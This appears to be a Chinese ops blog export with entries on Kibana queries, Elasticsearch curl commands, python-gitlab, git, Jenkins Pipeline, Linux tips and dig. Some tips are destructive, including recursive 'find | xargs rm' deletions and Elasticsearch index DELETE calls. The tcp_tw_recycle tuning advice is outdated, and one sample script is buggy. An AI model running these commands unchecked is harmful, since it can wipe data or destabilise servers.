当你提交一个查询请求时，直方图、文档表和字段列表都会更新，以反映搜索结果。命中（匹配到的文档）总数会显示在工具栏中。文档表格中显示了前500个命中。默认情况下，按时间倒序排列，首先显示最新的文档。你可以通过点击“Time”列来逆转排序顺序。 Lucene查询语法Kibana查询语言基于Lucene查询语法。下面是一些提示，可能会帮到你： 为了执行一个文本搜索，可以简单的输入一个文本字符串。例如，如果你想搜索web服务器的日志，你可以输入关键字”safari“，这样你就可以搜索到所有有关”safari”的字段 为了搜索一个特定字段的特定值，可以用字段的名称作为前缀。例如，你输入”status:200“，将会找到所有status字段的值是200的文档 为了搜索一个范围值，你可以用括号范围语法，[START_VALUE TO END_VALUE]。例如，为了找到状态码是4xx的文档，你可以输入status:[400 TO 499] 为了指定更改复杂的查询条件，你可以用布尔操作符 AND , OR , 和 NOT。例如，为了找到状态码是4xx并且extension字段是php或者html的文档，你可以输入status:[400 TO 499] AND (extension:php OR extension:html) Kibana查询语法增强新的更简单的语法 如果你熟悉Kibana的旧Lucene查询语法，那么你应该对这种新的语法也不会陌生。基本原理保持不变，我们只是简单地改进了一些东西，使查询语言更易于使用。 response:200 将匹配response字段的值是200的文档 用引号引起来的一段字符串叫短语搜索。例如，message:”Quick brown fox” 将在message字段中搜索”quick brown fox”这个短语。如果没有引号，将会匹配到包含这些词的所有文档，而不管它们的顺序如何。这就意味着，会匹配到”Quick brown fox”，而不会匹配”quick fox brown”。（画外音：引号引起来作为一个整体） 查询解析器将不再基于空格进行分割。多个搜索项必须由明确的布尔运算符分隔。注意，布尔运算符不区分大小写。 在Lucene中，response:200 extension:php 等价于 response:200 and extension:php。这将匹配response字段值匹配200并且extenion字段值匹配php的文档。 如果我们把中间换成or，那么response:200 or extension:php将匹配response字段匹配200 或者 extension字段匹配php的文档。 默认情况下，and 比 or 具有更高优先级。 response:200 and extension:php or extension:css 将匹配response是200并且extension是php，或者匹配extension是css而response任意 括号可以改变这种优先级 response:200 and (extension:php or extension:css) 将匹配response是200并且extension是php或者css的文档 还有一种简写的方式： response:(200 or 404) 将匹配response字段是200或404的文档。字符值也可以是多个，比如：tags:(success and info and security) 还可以用not not response:200 将匹配response不是200的文档 response:200 and not (extension:php or extension:css) 将匹配response是200并且extension不是php也不是css的文档 范围检索和Lucene有一点点不同 代替 byte:&gt;1000，我们用byte &gt; 1000 &gt;, &gt;=, &lt;, &lt;= 都是有效的操作符 response:* 将匹配所有存在response字段的文档 通配符查询也是可以的。machine.os:win* 将匹配machine.os字段以win开头的文档，像”windows 7”和”windows 10”这样的值都会被匹配到。 通配符也允许我们一次搜索多个字段，例如，假设我们有machine.os和machine.os.keyword两个字段，我们想要搜索这两个字段都有”windows 10”，那么我们可以这样写”machine.os*:windows 10” 刷新搜索结果 按字段过滤 以上是控制列表显示哪些字段，还有一种方式是在查看文档数据的时候点那个像书一样的小图标 删除也是可以的 我们还可以编辑一个DSL查询语句，用于过滤筛选，例如 查看文档数据 查看文档上下文 查看字段数据统计 使用说明之Visualize Visualize使得你可以创建在你的Elasticsearch索引中的数据的可视化效果。然后，你可以构建dashboard来展示相关可视化。 Kibana可视化是基于Elasticsearch查询的。通过用一系列的Elasticsearch聚集来提取并处理你的数据，你可以创建图片来线上你需要了解的趋势、峰值和低点。 创建一个可视化为了创建一个可视化的视图： 第1步：点击左侧导航条中的“Visualize”按钮 第2步：点击“Create new visualization”按钮或者加号(+)按钮 第3步：选择一个可视化类型 第4步：指定一个搜索查询来检索可视化数据 第5步：在可视化的构建器中选择Y轴的聚合操作。例如，sum，average，count等等 第6步：设置X轴 例如： 更多请看这里 https://www.elastic.co/guide/en/kibana/current/createvis.html https://www.elastic.co/guide/en/kibana/current/xy-chart.html https://www.elastic.co/guide/en/kibana/current/visualize.html 使用说明之Dashboard Kibana仪表板显示可视化和搜索的集合。你可以安排、调整和编辑仪表板内容，然后保存仪表板以便共享它。 构建一个Dashboard第1步：在导航条上点击“Dashboard” 第2步：点击“Create new dashboard”或者“加号(+)”按钮 第3步：点击“Add”按钮 第4步：为了添加一个可视化，从可视化列表中选择一个，或者点击“Add new visualization”按钮新创建一个 第5步：为了添加一个已保存的查询，点击“Saved Search”选项卡，然后从列表中选择一个 第6步：当你完成添加并且调整了dashboard的内容后，去顶部菜单栏，点击“Save”，然后输入一个名字。 默认情况下，Kibana仪表板使用浅色主题。要使用深色主题，单击“选项”并选择“使用深色主题”。要将dark主题设置为默认，请转到管理&gt;Management &gt; Advanced ，并将dashboard:defaultDarkTheme设置为On。 使用说明之Monitoring12345Elasticsearch控制台打印日志[2018-08-15T14:48:26,874][INFO ][o.e.c.m.MetaDataCreateIndexService] [Px524Ts] [.monitoring-kibana-6-2018.08.15] creating index, cause [auto(bulk api)], templates [.monitoring-kibana], shards [1]/[0], mappings [doc]Kibana控制台打印日志log [03:26:53.605] [info][license][xpack] Imported license information from Elasticsearch for the [monitoring] cluster: mode: basic | status: active https://www.elastic.co/guide/en/kibana/current/elasticsearch-metrics.html 数据展示 经验心得验证filebeat是否取得数据把配置中，output配置打开，根据启动日志，看是否有数据进入 验证logstash是否取得数据把配置中，output 中stdout注释打开，并暂时把kafka或es注释掉，重启logstash，根据启动日志，看是否有数据进入 验证kafka是否取得数据1234#查看kafka topic列表/opt/kafka/bin/kafka-topics.sh --list --zookeeper localhost:2181#根据topic列表检查是否有数据流入/opt/kafka/bin/kafka-console-consumer.sh --zookeeper localhost:2181 --topic nginxlog --from-beginning 验证es是否有数据存入数据通过web页面或命令查看集群状态： 12345678910111213141516171819202122232425262728293031323334353637#常用命令curl -XGET 'localhost:9200/_cat/indices?v&amp;pretty' #查看索引curl -XGET 'localhost:9200/_cat/nodes?v&amp;pretty' #查看节点状态curl -XGET http://localhost:9200/_cluster/health?pretty #查看集群状态curl -XGET http://localhost:9200/_all #查看所有索引信息curl -XDELETE 'http://localhost:9200/twitter,fgfg,ghjg/' #删除一个或多个索引 中间用，隔开 _all表示删除所有，并支持通配符*curl -XGET 'http://localhost:9200/twitter/_settings,_mappings' #支持参数 The available features are _settings, _mappings, _warmers and _aliases.es增删改查创建一个新的索引test，设置分片数为1，通过mapping初始化一个type1,type1有一个属性field1curl -XPUT http://localhost:9200/test -d'&#123; "settings" : &#123; "number_of_shards" : 1 &#125;, "mappings" : &#123; "type1" : &#123; "properties" : &#123; "field1" : &#123; "type" : "text" &#125; &#125; &#125; &#125;&#125;'删除索引twittercurl -XDELETE 'http://localhost:9200/twitter查看索引curl -XGET 'localhost:9200/_cat/indices?v&amp;pretty'更新索引可以局部更新，新增字段等等curl -XPOST localhost:9200/索引名称/字段名/id/_update -d'&#123; "doc": &#123; "name": "Jane Doe",'age':'30' &#125;&#125;'curl -u username:password -XGET '172.18.238.3:9200/_cat/indices?v&amp;pretty']]></content>
      <categories>
        <category>应用运维</category>
        <category>服务搭建</category>
      </categories>
      <tags>
        <tag>Elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python操作gitlab API接口]]></title>
    <url>%2Farticles%2F79cf2ce7.html</url>
    <content type="text"><![CDATA[使用 python-gitlab 模块来调用gitlab的API来管理和操作gitlab。 参考官方文档 安装123pip install python-gitlab# 如果是安装到Python3使用可以使用如下命令pip3 install python-gitlab 配置为了保护API 用到的 private_token，一般会将其写到系统的配置文件中去/etc/python-gitlab.cfg 或者 ~/.python-gitlab.cfg 配置示例： 1234567891011vim ~/.python-gitlab.cfg[global]default = sunssh_verify = Falsetimeout = 8[sun]url = http://10.0.0.6private_token = xxxxx-V4Yxxxxxxks7uapi_version = 3 实例在程序中使用的时候可以直接用如下方式调用 1234567## logingl = gitlab.Gitlab.from_config('sun', ['~/.python-gitlab.cfg'])## 得到第一页project列表projects = gl.projects.list()## 得到所有projectprojects = gl.projects.list(all=True)projects = gl.projects.all() 附件脚本自定义脚本获取指定用户或者分组或者全部的代码仓库地址 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/usr/bin/env python3# encoding: utf-8__Author__ = 'Sun'__Date__ = '2019--6-10'import gitlabimport osimport sysclass GitlabAPI(object): def __init__(self, *args, **kwargs): if os.path.exists('/etc/python-gitlab.cfg'): self.gl = gitlab.Gitlab.from_config('sun', ['/etc/python-gitlab.cfg']) elif os.path.exists(os.getenv('HOME') + '/.python-gitlab.cfg'): self.gl = gitlab.Gitlab.from_config('kaishugit', [os.getenv('HOME') + '/.python-gitlab.cfg']) else: print('You need to make sure there is a file named "/etc/python-gitlab.cfg" or "~/.python-gitlab.cfg"') sys.exit(5) def get_user_id(self, username): user = self.gl.users.get_by_username(username) return user.id def get_group_id(self, groupname): group = self.gl.users.search(groupname) return group[0].id def get_all_projects(self): projects = self.gl.projects.list(all=True) result_list = [] for project in projects: result_list.append(project.http_url_to_repo) return result_list def get_user_projects(self, userid): projects = self.gl.projects.owned(userid=userid, all=True) result_list = [] for project in projects: result_list.append(project.http_url_to_repo) return result_list def get_group_projects(self, groupname): projects = self.gl.projects.owned(groupname=groupname, all=True) result_list = [] for project in projects: result_list.append(project.http_url_to_repo) return result_listif __name__ == '__main__': git = GitlabAPI() userprojects = git.get_user_projects() print(userprojects)]]></content>
      <categories>
        <category>系统运维</category>
        <category>语言详解</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git命令汇总]]></title>
    <url>%2Farticles%2F6581af91.html</url>
    <content type="text"><![CDATA[目的对常用的git命令进行汇总和注释，在使用时如需查询可更高效的查询到。 Git命令查看、添加、提交、删除、找回，重置修改文件 1234567891011121314151617181920212223242526272829git help &lt;command&gt; # 显示command的helpgit show # 显示某次提交的内容 git show $idgit co -- &lt;file&gt; # 抛弃工作区修改git co . # 抛弃工作区修改git add &lt;file&gt; # 将工作文件修改提交到本地暂存区git add . # 将所有修改过的工作文件提交暂存区git rm &lt;file&gt; # 从版本库中删除文件git rm &lt;file&gt; --cached # 从版本库中删除文件，但不删除文件git reset &lt;file&gt; # 从暂存区恢复到工作文件git reset -- . # 从暂存区恢复到工作文件git reset --hard # 恢复最近一次提交过的状态，即放弃上次提交后的所有本次修改git ci &lt;file&gt; git ci . git ci -a # 将git add, git rm和git ci等操作都合并在一起做 git ci -am "some comments"git ci --amend # 修改最后一次提交记录git revert &lt;$id&gt; # 恢复某次提交的状态，恢复动作本身也创建次提交对象git revert HEAD # 恢复最后一次提交的状态 查看文件diff 1234567891011git diff &lt;file&gt; # 比较当前文件和暂存区文件差异 git diffgit diff &lt;id1&gt;&lt;id1&gt;&lt;id2&gt; # 比较两次提交之间的差异git diff &lt;branch1&gt;..&lt;branch2&gt; # 在两个分支之间比较git diff --staged # 比较暂存区和版本库差异git diff --cached # 比较暂存区和版本库差异git diff --stat # 仅仅比较统计信息 查看提交记录 1234567git log git log &lt;file&gt; # 查看该文件每次提交记录 git log -p &lt;file&gt; # 查看每次详细修改内容的diff git log -p -2 # 查看最近两次详细修改内容的diff git log --stat #查看提交统计信息 查看、切换、创建和删除分支 1234567891011121314151617181920212223git br -r # 查看远程分支 git br &lt;new_branch&gt; # 创建新的分支 git br -v # 查看各个分支最后提交信息 git br --merged # 查看已经被合并到当前分支的分支 git br --no-merged # 查看尚未被合并到当前分支的分支 git co &lt;branch&gt; # 切换到某个分支 git co -b &lt;new_branch&gt; # 创建新的分支，并且切换过去 git co -b &lt;new_branch&gt; &lt;branch&gt; # 基于branch创建新的new_branch git co $id # 把某次历史提交记录checkout出来，但无分支信息，切换到其他分支会自动删除 git co $id -b &lt;new_branch&gt; # 把某次历史提交记录checkout出来，创建成一个分支 git br -d &lt;branch&gt; # 删除某个分支 git br -D &lt;branch&gt; # 强制删除某个分支 (未被合并的分支被删除的时候需要强制) 分支合并和rebase 12345git merge &lt;branch&gt; # 将branch分支合并到当前分支 git merge origin/master --no-ff # 不要Fast-Foward合并，这样可以生成merge提交 git rebase master &lt;branch&gt; # 将master rebase到branch，相当于： git co &lt;branch&gt; &amp;&amp; git rebase master &amp;&amp; git co master &amp;&amp; git merge &lt;branch&gt; 补丁管理 12345git diff &gt; ../sync.patch # 生成补丁git apply ../sync.patch # 打补丁git apply --check ../sync.patch #测试补丁能否成功 暂存管理 1234567git stash # 暂存 git stash list # 列所有stash git stash apply # 恢复暂存的内容 git stash drop # 删除暂存区 远程分支管理 1234567891011121314151617181920212223git pull # 抓取远程仓库所有分支更新并合并到本地git pull --no-ff # 抓取远程仓库所有分支更新并合并到本地，不要快进合并git fetch origin # 抓取远程仓库更新git merge origin/master # 将远程主分支合并到本地当前分支git co --track origin/branch # 跟踪某个远程分支创建相应的本地分支git co -b &lt;local_branch&gt; origin/&lt;remote_branch&gt; # 基于远程分支创建本地分支，功能同上git push # push所有分支git push origin master # 将本地主分支推到远程主分支git push -u origin master # 将本地主分支推到远程(如无远程主分支则创建，用于初始化远程仓库)git push origin &lt;local_branch&gt; # 创建远程分支， origin是远程仓库名git push origin &lt;local_branch&gt;:&lt;remote_branch&gt; # 创建远程分支git push origin :&lt;remote_branch&gt; #先删除本地分支(git br -d &lt;branch&gt;)，然后再push删除远程分支 远程仓库管理 123456789git remote -v # 查看远程服务器地址和仓库名称 git remote show origin # 查看远程服务器仓库状态 git remote add origin git@ github:wandouduoduo/wandouduoduo.git # 添加远程仓库地址 git remote set-url origin git@ github.com:wandouduoduo/wandouduoduo.git # 设置远程仓库地址(用于修改远程仓库地址) git remote rm &lt;repository&gt; # 删除远程仓库 创建远程仓库 123456789mkdir wandouduoduo &amp;&amp; cd wandouduoduo &amp;&amp; git --bare init # 在服务器创建纯仓库 git remote add origin git@ github.com:wandouduoduo/wandouduoduo.git # 设置远程仓库地址 git push -u origin master # 客户端首次提交 git push -u origin develop # 首次将本地develop分支提交到远程develop分支，并且track git remote set-head origin master # 设置远程仓库的HEAD指向master分支 也可以命令设置跟踪远程库和本地库 123git branch --set-upstream master origin/master git branch --set-upstream develop origin/develop]]></content>
      <categories>
        <category>系统运维</category>
        <category>命令详解</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[玩转Jenkins Pipeline]]></title>
    <url>%2Farticles%2Fb3592bd0.html</url>
    <content type="text"><![CDATA[介绍Pipeline，简而言之，就是一套运行于Jenkins上的工作流框架，将原本独立运行于单个或者多个节点的任务连接起来，实现单个任务难以完成的复杂流程编排与可视化。 Pipeline是Jenkins2.X的最核心的特性，帮助Jenkins实现从CI到CD与DevOps的转变。Pipeline是一组插件，让Jenkins可以实现持续交付管道的落地和实施。 持续交付管道（CD Pipeline）是将软件从版本控制阶段到交付给用户或客户的完整过程的自动化表现。软件的每一次更改（提交到源代码管理系统）都要经过一个复杂的过程才能被发布。 Pipeline提供了一组可扩展的工具，通过Pipeline Domain Specific Language（DSL）syntax可以达到Pipeline as Code（Jenkinsfile存储在项目的源代码库）的目的。 特点Stage: 阶段 一个Pipeline可以划分成若干个Stage，每个Stage代表一组操作，例如：“Build”，“Test”，“Deploy”。 注意，Stage是一个逻辑分组的概念，可以跨多个Node Node：节点 一个Node就是一个Jenkins节点，或者是Master，或者是Agent，是执行Step的具体运行环境。 Step：步骤 Step是最基本的操作单元，小到创建一个目录，大到构建一个Docker镜像，由各类Jenklins Plugin提供，例如：sh ‘make’ Pipeline五大特性 代码:Pipeline以代码的形式实现，通常被检入源代码控制，使团队能够编辑、审查和迭代其CD流程。可持续性：Jenklins重启或者中断后都不会影响Pipeline Job。停顿：Pipeline可以选择停止并等待任工输入或批准，然后再继续Pipeline运行。多功能：Pipeline支持现实世界的复杂CD要求，包括fork/join子进程，循环和并行执行工作的能力可扩展：Pipeline插件支持其DSL的自定义扩展以及与其他插件集成的多个选项。Pipeline和Freestyle的区别 Freestyle和Pipeline区别 Freestyle：上游/下游Job调度，如BuildJob —&gt; TestJob —&gt; DeployJob在DSL Job里面调度多个子Job（利用Build Flow Plugin） Pipeline：单个Job中完成所有的任务编排 Multibranch Pipeline根据你的代码中Jenlinsfile自动创建Job 基础语法Pipeline脚本是由Groovy语言实现（无需专门学习） 支持两种语法Declarative 声明式（在Pipeline plugin 2.5中引入）Scripted Pipeline 脚本式 如何创建最基本的PIpeline直接在Jenkins Web UI 网页界面中输入脚本通过创建一个jenkinsfile可以检入项目的源代码管理库 通常推荐在Jenkins中直接从源代码控制（SCM）中载入Jenklinsfile Pipeline 声明式Pipeline 声明式Pipeline的基本语法和表达式遵循与Groovy语法相同的规则，但有以下例外： 声明式pipeline必须包含在固定格式pipeline{}快内每个声明语句必须独立一行，行尾无需使用分号 块（blocks{}）只能包含章节（Sections），指令（Directives），步骤（Steps）或赋值语句属性引用语句被视为无参数方法调用。例：输入被视为 input()块（blocks{}）由大括号括起来的语句，如pipeline{},Section{},parameters{},script{}章节（Sections）通常包含一个或多个指令或步骤。如 agent 、post、stages、steps指令（Directives）environment、options、parameters、triggers（触发）、stage、tools、when步骤（Steps）Pipeline steps reference执行脚本式pipeline：使用script{} agent必须存在，agent必须在pipeline块内的顶层定义，但stage内是否使用使可选的参数：any/none/label/node/docker/dockerfile常用选项 label/cuetomWorkspace/reuseNode 示例 12345678910111213141516agent &#123; label &apos;my-label&apos; &#125;agent &#123; node &#123; label &apos;my-label&apos; customWorkspace &apos;/some/other/path&apos; &#125;&#125;agent &#123; docker &#123; image &apos;nginx:1.12.2&apos; label &apos;my-label&apos; args &apos;-v /tmp:/tmp&apos; &#125;&#125; post 不是必须的，用于pipeline的最外层或者stage{}中 123456789101112131415pipeline &#123; agent any stages &#123; stage(&apos;Example&apos;)&#123; steps &#123; echo &apos;Hello world&apos; &#125; &#125; &#125; post &#123; always &#123; echo &apos;say goodbay&apos; &#125; &#125;&#125; stages 必须，包括顺序执行的一个或多个stage命令，在pipeline内仅能使用一次，通常位于agent/options后面，例子如上 steps 必须，steps位于stage指令块内部，包括一个或多个step。仅有一个step的情况下可以忽略关键字step及其{},例子如上 environment 不是必须的，environment定义了一组全局的环境变量键值对，存在于pipeline{}或者stage指令内。执行特殊方法credentials()可以获取jenkins中预定义的凭证明文内容 123environment &#123;CC=&apos;clang&apos;&#125;environment &#123;AN_ACCESS_KEY = credentials(&apos;my-prefined-secret-text&apos;)&#125;steps &#123;sh &apos;printenv&apos;&#125; options 不是必须的 预定义pipeline专有的配置信息，仅可定义一次 1234567pipeline &#123; agent any options&#123; timeout(time:1,unit: &apos;HOURS&apos;) &#125; ...&#125; parameters 不是必须的 定义参数化构建的参数可选参数 booleanParam,choice,file,text,password,run,string 12345678paramenters &#123; choice(name:&apos;PerformMavenRelease&apos;,choices:&apos;False\nTrue&apos;,description:&apos;desc&apos;) password(name:&apos;CredsToUse&apos;,description:&apos;Apassword to build with&apos;,defaultValue:&apos;&apos;)&#125;environment &#123; BUILD_USR_CHOICE=&quot;$&#123;params.PerformMavenRelease&#125;&quot; BUILD_USR_CREDS=&quot;$&#123;params.CredsToUse&#125;&quot;&#125; triggers 不是必须的 定义pipeline被自动触发的方式选项 cron、pollSCM、upstream 123triggers &#123;cron(&apos;H 4/* 0 0 1-5&apos;)&#125;triggers &#123;pollSCM(&apos;H 4/* 0 0 1-5&apos;)&#125;triggers &#123;upstream(upstreamProjects:&apos;job1,job2&apos;,threshold:hudson.model.Result.SUCCESS)&#125; 快速创建一个pipeline新建 选择pipeline 填写Job 的名字 填写相应的pipeline script 1234567891011121314151617181920pipeline&#123; agent any stages &#123; stage(&apos;Build&apos;) &#123; steps&#123; echo &apos;This is a build step&apos; &#125; &#125; stage(&apos;Test&apos;) &#123; steps&#123; echo &apos;This is a test step&apos; &#125; &#125; stage(&apos;Deploy&apos;) &#123; steps&#123; echo &apos;This is a deploy step&apos; &#125; &#125; &#125;&#125; 保存之后，立即构建 常用的辅助工具Snipper Generator（代码片段生成器，语法检查器）Replay Pipeline（重放pipeline，可以修改script，修改后的不存入config.xml）DSL Reference 语法参考手册全局变量引用Stage ViewBlueOcean(可视化)Pipeline神器：可视化编辑器命令行Pipeline调试工具]]></content>
      <categories>
        <category>应用运维</category>
        <category>服务优化</category>
      </categories>
      <tags>
        <tag>Jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux用法技巧]]></title>
    <url>%2Farticles%2F1d19f8d4.html</url>
    <content type="text"><![CDATA[目的根据自己多年的工作经历和经验，对日常中的细节技巧和用法进行归纳和总结。 持续更新中… 技巧详解指定特定用户执行命令1sudo -H -u www bash -c 'nohup /home/web/ke/upfileserver /home/web/ke/up/conf.json &amp;' 统计机器中网络连接各个状态个数1netstat -an | awk '/^tcp/ &#123;++S[$NF]&#125; END &#123;for (a in S) print a,S[a]&#125; ' 删除乱码1find . ! -regex '.*\.jar\|.*\.war\|.*\.zip'|xargs rm 过滤IP1grep -E -o "172.18.[0-9]&#123;1,3&#125;[\.][0-9]&#123;1,3&#125;" filename 获取本机IP123ipaddr=$(ip addr | awk '/^[0-9]+: / &#123;&#125;; /inet.*global/ &#123;print gensub(/(.*)\/(.*)/, "\\1", "g", $2)&#125;')echo $ipaddr TIME_WAIT过多的解决办法1234567891011121314151617181920212223242526272829查看当前状态cat /proc/sys/net/ipv4/tcp_tw_reusecat /proc/sys/net/ipv4/tcp_tw_recyclenetstat -n | awk '/^tcp/ &#123;++state[$NF]&#125; END &#123;for(key in state) print key,"/t",state[key]&#125;'修改内核参数方法一：直接修改参数文件echo "1" &gt; /proc/sys/net/ipv4/tcp_tw_reuse#让TIME_WAIT尽快回收，我也不知是多久，观察大概是一秒钟echo "1" &gt; /proc/sys/net/ipv4/tcp_tw_recycle方法二：命名修改内核参数并生效[root@aaa1 ~]# sysctl -a|grep net.ipv4.tcp_twnet.ipv4.tcp_tw_reuse = 0net.ipv4.tcp_tw_recycle = 0[root@aaa1 ~]#vi /etc/sysctl增加或修改net.ipv4.tcp_tw值：net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 1使内核参数生效：[root@aaa1 ~]# sysctl -p[root@aaa1 ~]# sysctl -a|grep net.ipv4.tcp_twnet.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 1用netstat再观察正常 Linux Top命令 选择显示列及列排序Top用于查看Linux系统下进程信息，有时候需要选择显示那些列，以及按照某一列进行排序。查询整理如下： 选择显示列：执行top命令后，按 f 键，再按某一列的代表字母，即可选中或取消显示； 列显示位置调整：执行top命令后，按 o 键，选择要调整位置的列（如K:CUP Usageage），按动一下大写K则显示位置往上调整，按动一下小写K则显示位置往下调整。 列排序：执行top命令后，按 shift + f（小写），进入选择排序列页面，再按要排序的列的代表字母即可； 输入大写P，则结果按CPU占用降序排序。输入大写M，结果按内存占用降序排序。（注：大写P可以在capslock状态输入p，或者按Shift+p） no space left on device的解决方法(iNode满导致)今天在腾讯云的服务器被攻击后，apache启动报错，查找原因发现是磁盘空间不够no space left on device， 诡异的是df命令磁盘占用仅55% 继续查找原因，发现是iNode已满，即没有索引空间 这就好办了，首先定位哪个目录占用iNode最多，命令如下： 1find */ ! -type l | cut -d / -f 1 | uniq -c 定位完成，清理目录，整个世界都清净了 123find /tmp -type f -exec rm &#123;&#125; \;find /home -type f -size 0 -exec rm &#123;&#125; \;]]></content>
      <categories>
        <category>系统运维</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dig命令详解]]></title>
    <url>%2Farticles%2F4352880d.html</url>
    <content type="text"><![CDATA[简介：Dig是一个在类Unix命令行模式下查询DNS包括NS记录，A记录，MX记录等相关信息的工具。由于一直缺失Dig man page文档，本文就权当一个dig使用向导吧。Dig的源码是ISC BIND大包的一部分，但是大多编译和安装Bind的文档都不把它包括在内，但是在linux系统下，它通常是某个包的一部分，在Gentoo下是bind-tools，在Redhat/Fedora下是 bind-utils，或者在Debian下是 dnsutils。如果你要查找Bind的配置相关的信息，请详读参考文档。 看懂默认输出：最简单最常见的查询是查询一台主机，但是默认情况下，Dig的输出信息很详细。你可能不需要所有的输出，但是它确实值得知道。 查询123456789101112131415161718192021222324252627282930313233343536下面是一个带有注释的查询：$ dig www.isc.org上面是我调用dig 的命令行。; &lt;&lt;&gt;&gt; DiG 9.2.3 &lt;&lt;&gt;&gt; www.isc.org;; global options: printcmdDig的部分输出告诉我们一些有关于它的版本信息(version 9.2.3)和全局的设置选项，如果+nocmd在命令行下是第一个参数的话，那么这部分输出可以通过加+nocmd的方式查询出来。;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 43071;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 3, ADDITIONAL: 3在这里，Dig告诉我们一些从DNS返回的技术信息，这段信息可以用选项 +[no]comments来控制显示，但是小心，禁止掉comments也可能关闭一些其它的选项。;; QUESTION SECTION:;www.isc.org. IN A在这个查询段中，Dig显示出我们查询的输出，默认的查询是查询A记录，你可以显示或者禁止掉这些用+[no]question选项;; ANSWER SECTION:www.isc.org. 600 IN A 204.152.184.88最后，我们得到我们查询的结果。www.isc.org 的地址是204.152.184.8，我不知道为什么你们更喜欢过滤掉这些输出，但是你可以用+[no]answer保留这些选项。;; AUTHORITY SECTION:isc.org. 2351 IN NS ns-int.isc.org.isc.org. 2351 IN NS ns1.gnac.com.isc.org. 2351 IN NS ns-ext.isc.org.这段权威说明告诉我们哪个DNS服务器给我们提供权威的答案。在这个例子中，isc.org有3个Name Server，你可以用+[no]authority选项保留这段输出。;; ADDITIONAL SECTION:ns1.gnac.com. 171551 IN A 209.182.216.75ns-int.isc.org. 2351 IN A 204.152.184.65ns-int.isc.org. 2351 IN AAAA 2001:4f8:0:2::15这些额外选项很有代表性地包含了列出的权威DNS的IP地址，这段输出可以用+[no]additional选项保留。;; Query time: 2046 msec;; SERVER: 127.0.0.1#53(127.0.0.1);; WHEN: Fri Aug 27 08:22:26 2004;; MSG SIZE rcvd: 173最后一段默认输出包含了查询的统计数据，可以用+[no]stats保留。 作用最后一段默认输出包含了查询的统计数据，可以用+[no]stats保留。 我们可以查询什么呢？Dig可以让你有效地查询DNS，最常用的查询是A记录，TXT（文本注释），MX记录，NS记录，或者任意综合查询。 查找yahoo.com的A记录：（此处一定是域而不是主机，如我公司为xinpindao.com) 1dig yahoo.com A +noall +answer 查找yahoo.com MX记录的列表： 1dig yahoo.com MX +noall +answer 查找yahoo.com的权威DNS： 1dig yahoo.com NS +noall +answer 查询上面所有的记录： 1dig yahoo.com ANY +noall +answer 在现在这种IPv4和IPV6混用的情况下，你也可以使用AAAA的选项查询主机的IPv6 AAAA记录： 1dig yahoo.com AAAA +short 如果你要查询的域允许转发，你也可以查询到相关的信息，比如DNS记录在internet上的生存周期，但是，现在只有很少的DNS允许无限制转发。 我们怎样查询？获得精简答案呢？当我们需要一个快速回答时，+short选项是你最好的朋友: 12dig yahoo.com +short204.152.184.88 获得一个不是十分精简的答案？精简答案和只有一个答案是不一样的， 获得没有附加信息的详细答案的方法是使用+noall选项，这样就只保留你想要的输出。下面是只有一个答案的精简查询，最后包含所有的配置信息，包括TTL数据，格式化的BIND配置信息。 12345678$ dig fsf.org mx +short20 mx20.gnu.org.30 mx30.gnu.org.10 mx10.gnu.org.$ dig +nocmd fsf.org mx +noall +answerfsf.org. 3583 IN MX 30 mx30.gnu.org.fsf.org. 3583 IN MX 10 mx10.gnu.org.fsf.org. 3583 IN MX 20 mx20.gnu.org. 获得一个详细答案？通过它的man page，你可以通过+multiline选项获得冗长的多行模式人性化注释的DSN的SOA记录，一般来说，用+multiline选项获得的信息可以显示很多，就像BIND配置文件一样。 1234567891011121314$ dig +nocmd ogi.edu any +multiline +noall +answerogi.edu. 14267 IN A 129.95.59.31ogi.edu. 14267 IN MX 5 cse.ogi.edu.ogi.edu. 14267 IN MX 15 hermes.admin.ogi.edu.ogi.edu. 14267 IN SOA zeal.admin.ogi.edu. hostmaster.admin.ogi.edu. ( 200408230 ; serial 14400 ; refresh (4 hours) 900 ; retry (15 minutes) 3600000 ; expire (5 weeks 6 days 16 hours) 14400 ; minimum (4 hours) )ogi.edu. 14267 IN NS zeal.admin.ogi.edu.ogi.edu. 14267 IN NS cse.ogi.edu.ogi.edu. 14267 IN NS fork.admin.ogi.edu. 查找PTR记录？可以用 -x的选项查找IP地址的主机名。 123456789$ dig -x 204.152.184.167 +shortmx-1.isc.org.在这个循环中，脚本很灵活地在给出的子网中映射出名字。#!/bin/bashNET=18.7.22for n in $(seq 1 254); do ADDR=$&#123;NET&#125;.$&#123;n&#125; echo -e &quot;$&#123;ADDR&#125;\t$(dig -x $&#123;ADDR&#125; +short)&quot;done 查询一个不同的命名服务器？ 查询命令如下： 1dig @ns1.google.com www.google.com 使用/etc/resolv.conf里面的记录查询主机将从/etc/resolv.conf文件里面自动查询DNS记录 12$ host wwwwww.wandouduoduo.com has address 65.102.49.170 但是，默认情况下，dig会产生出一些意想不到的输出。如果你想查询本地主机名而不是全域名时候，使用+search 选项 1dig www +search 处理大部分的查询？如果你想查询大量的主机名，你可以把它们存放在一个文本文件中(一条记录一行)，使用带-f参数的dig来依次查询。 查询大量的主机名 1dig -f /path/to/host-list.txt 相同的，更明确的输出 1dig -f /path/to/host-list.txt +noall +answer 但是我要告诉你的是，dig 9.2.3以及以后的版本都不支持使用-f的选项反向查询了。 